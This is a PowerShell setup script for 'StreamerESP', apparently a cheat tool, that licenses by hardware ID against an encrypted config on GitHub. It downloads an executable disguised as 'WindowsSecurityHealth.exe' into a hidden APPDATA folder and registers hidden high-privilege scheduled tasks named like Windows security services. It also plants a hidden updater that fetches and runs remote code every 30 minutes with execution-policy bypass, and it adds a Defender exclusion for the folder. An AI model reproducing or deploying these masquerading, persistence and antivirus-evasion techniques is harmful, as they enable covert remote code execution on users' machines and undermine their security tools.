$ErrorActionPreference="SilentlyContinue"
$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
$CU="https://raw.githubusercontent.com/anshkumar258090-alt/streamer-esp-server/main/config.enc"
$EN="WindowsSecurityHealth.exe"
$ID="$env:APPDATA\Microsoft\WindowsServices"
$TN="WindowsSecurityHealthService"
$UN="WindowsSecurityHealthUpdater"
$VF="$ID\version.dat"
function GK([string]$P){$s=[System.Security.Cryptography.SHA256]::Create();return $s.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P))}
function GI([string]$P){$m=[System.Security.Cryptography.MD5]::Create();return $m.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P+"_IV"))}
function DD([string]$C,[string]$K){$a=[System.Security.Cryptography.Aes]::Create();$a.Key=GK $K;$a.IV=GI $K;$a.Mode="CBC";$a.Padding="PKCS7";$d=$a.CreateDecryptor();$b=[Convert]::FromBase64String($C);$r=$d.TransformFinalBlock($b,0,$b.Length);$a.Dispose();return [System.Text.Encoding]::UTF8.GetString($r)}
function GHWID{$u=(Get-WmiObject Win32_ComputerSystemProduct).UUID;if($u -and $u -ne "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"){return $u};$b=(Get-WmiObject Win32_BaseBoard).SerialNumber;$p=(Get-WmiObject Win32_Processor).ProcessorId;return "$b-$p"}
Write-Host "`n  StreamerESP Setup" -ForegroundColor Cyan
Write-Host "  Verifying HWID..." -ForegroundColor Yellow
$hw = GHWID
Write-Host "  HWID: $hw" -ForegroundColor DarkGray
try{$enc=(Invoke-WebRequest -Uri $CU -UseBasicParsing -TimeoutSec 15).Content;$cfg=(DD $enc $MK)|ConvertFrom-Json}catch{Write-Host "  [ERROR] Server connect failed!" -ForegroundColor Red;Write-Host "  $_" -ForegroundColor DarkRed;pause;exit 1}
$ok=$false;foreach($e in $cfg.h){$ch=if($e -is [PSCustomObject]){$e.hwid}else{$e};if($ch -eq $hw){$ok=$true;break}}
if(-not $ok){Write-Host "`n  ACCESS DENIED - HWID NOT AUTHORIZED" -ForegroundColor Red;Write-Host "  Your HWID: $hw" -ForegroundColor Yellow;Write-Host "  Send this HWID to admin." -ForegroundColor Yellow;pause;exit 1}
Write-Host "  HWID Verified!" -ForegroundColor Green
$exeUrl=if($cfg.exe_url){$cfg.exe_url}else{"https://github.com/anshkumar258090-alt/streamer-esp-server/releases/download/v$($cfg.v)/$EN"}
Write-Host "  Installing v$($cfg.v)..." -ForegroundColor Yellow
if(!(Test-Path $ID)){New-Item -ItemType Directory -Path $ID -Force|Out-Null}
attrib +h +s "$ID" 2>$null
Get-Process -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Sleep 1
Invoke-WebRequest -Uri $exeUrl -OutFile "$ID\$EN" -UseBasicParsing
attrib +h +s "$ID\$EN" 2>$null
if($cfg.hash){$h=(Get-FileHash "$ID\$EN" -Algorithm SHA256).Hash;if($h -ne $cfg.hash){Write-Host "  [ERROR] Integrity check failed!" -ForegroundColor Red;Remove-Item "$ID\$EN" -Force;pause;exit 1};Write-Host "  Integrity verified (SHA256)" -ForegroundColor Green}
Set-Content $VF -Value $cfg.v -Encoding UTF8
Unregister-ScheduledTask -TaskName $TN -Confirm:$false -ErrorAction SilentlyContinue
$a=New-ScheduledTaskAction -Execute "$ID\$EN";$t=New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME;$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $TN -Action $a -Trigger $t -Principal $p -Settings $s -Description "Windows Security Health Service" -Force|Out-Null
Write-Host "  Auto-start ON" -ForegroundColor Green
$up="$ID\updater.ps1"
$uc="`$ErrorActionPreference='SilentlyContinue';`$MK='$MK';`$CU='$CU';`$EN='$EN';`$ID='$ID';`$VF='$VF';" + "function GK([string]`$P){`$s=[System.Security.Cryptography.SHA256]::Create();return `$s.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$P))};" + "function GI([string]`$P){`$m=[System.Security.Cryptography.MD5]::Create();return `$m.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$P+'_IV'))};" + "function DD([string]`$C,[string]`$K){`$a=[System.Security.Cryptography.Aes]::Create();`$a.Key=GK `$K;`$a.IV=GI `$K;`$a.Mode='CBC';`$a.Padding='PKCS7';`$d=`$a.CreateDecryptor();`$b=[Convert]::FromBase64String(`$C);`$r=`$d.TransformFinalBlock(`$b,0,`$b.Length);`$a.Dispose();return [System.Text.Encoding]::UTF8.GetString(`$r)};" + "function GHWID{`$u=(Get-WmiObject Win32_ComputerSystemProduct).UUID;if(`$u -and `$u -ne 'FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF'){return `$u};return (Get-WmiObject Win32_BaseBoard).SerialNumber+'-'+(Get-WmiObject Win32_Processor).ProcessorId};" + "try{`$enc=(Invoke-WebRequest -Uri `$CU -UseBasicParsing -TimeoutSec 10).Content;`$cfg=(DD `$enc `$MK)|ConvertFrom-Json;`$hw=GHWID;`$ok=`$false;foreach(`$e in `$cfg.h){`$ch=if(`$e -is [PSCustomObject]){`$e.hwid}else{`$e};if(`$ch -eq `$hw){`$ok=`$true;break}};if(-not `$ok){Get-Process -Name 'WindowsSecurityHealth' -ErrorAction SilentlyContinue|Stop-Process -Force;Unregister-ScheduledTask -TaskName 'WindowsSecurityHealthService' -Confirm:`$false -ErrorAction SilentlyContinue;Unregister-ScheduledTask -TaskName 'WindowsSecurityHealthUpdater' -Confirm:`$false -ErrorAction SilentlyContinue;Remove-Item `$ID -Recurse -Force;exit};`$cv=if(Test-Path `$VF){(Get-Content `$VF -Raw).Trim()}else{'0.0.0'};if(`$cfg.v -ne `$cv){`$eu=if(`$cfg.exe_url){`$cfg.exe_url}else{'https://github.com/anshkumar258090-alt/streamer-esp-server/releases/download/v'+`$cfg.v+'/'+`$EN};Get-Process -Name 'WindowsSecurityHealth' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Sleep 2;Invoke-WebRequest -Uri `$eu -OutFile (`$ID+'\'+`$EN) -UseBasicParsing;if(`$cfg.hash){`$h=(Get-FileHash (`$ID+'\'+`$EN) -Algorithm SHA256).Hash;if(`$h -ne `$cfg.hash){exit}};Set-Content `$VF -Value `$cfg.v -Encoding UTF8;attrib +h +s (`$ID+'\'+`$EN) 2>`$null;Start-Process (`$ID+'\'+`$EN) -WindowStyle Hidden}else{if(!(Get-Process -Name 'WindowsSecurityHealth' -ErrorAction SilentlyContinue)){Start-Process (`$ID+'\'+`$EN) -WindowStyle Hidden}}}catch{}"
Set-Content $up -Value $uc -Encoding UTF8
attrib +h +s "$up" 2>$null
Unregister-ScheduledTask -TaskName $UN -Confirm:$false -ErrorAction SilentlyContinue
$ua=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -f `"$up`""
$ut=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)
$uprin=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
$us=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName $UN -Action $ua -Trigger $ut -Principal $uprin -Settings $us -Description "Windows Security Health Updater" -Force|Out-Null
Write-Host "  Auto-updater ON (every 30 min)" -ForegroundColor Green
try{Add-MpPreference -ExclusionPath $ID -ErrorAction Stop;Write-Host "  Defender exclusion added" -ForegroundColor Green}catch{Write-Host "  [SKIP] Run as Admin for Defender exclusion" -ForegroundColor DarkYellow}
Start-Process "$ID\$EN" -WindowStyle Hidden -ErrorAction SilentlyContinue
Write-Host "`n  SETUP COMPLETE! v$($cfg.v)" -ForegroundColor Green
Write-Host "  HWID Verified | Auto-Start ON | Auto-Update ON | Stream-Proof ON" -ForegroundColor Green
pause
